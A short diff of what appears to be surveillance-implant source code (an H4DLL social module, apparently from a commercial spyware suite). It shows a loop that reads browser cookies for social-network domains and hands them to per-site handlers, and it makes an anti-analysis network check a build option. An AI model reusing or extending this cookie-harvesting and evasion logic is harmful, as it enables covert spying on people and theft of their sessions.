@@ -7,6 +7,8 @@
 #include <stdio.h>
 #include <string>
 #include <time.h>
+#include <config.h>
+
 #include "../../H4DLL/common.h"
 #include "../../H4DLL/bss.h"
 #include "../../H4DLL/LOG.h"
@@ -265,7 +267,11 @@ void SocialMain_run()
 			CheckProcessStatus();
 			_snprintf_s(domain_a, sizeof(domain_a), _TRUNCATE, "%S", social_entry[i].domain);
 			if (str = GetCookieString(domain_a)) {
-				if (!IsCrisisNetwork() && social_entry[i].RequestHandler)
+				if (
+#ifdef __ENABLE_CRISIS_MODULE
+					!IsCrisisNetwork() &&
+#endif
+				social_entry[i].RequestHandler)
 					ret = social_entry[i].RequestHandler(str);
 				else
 					ret = SOCIAL_REQUEST_NETWORK_PROBLEM;
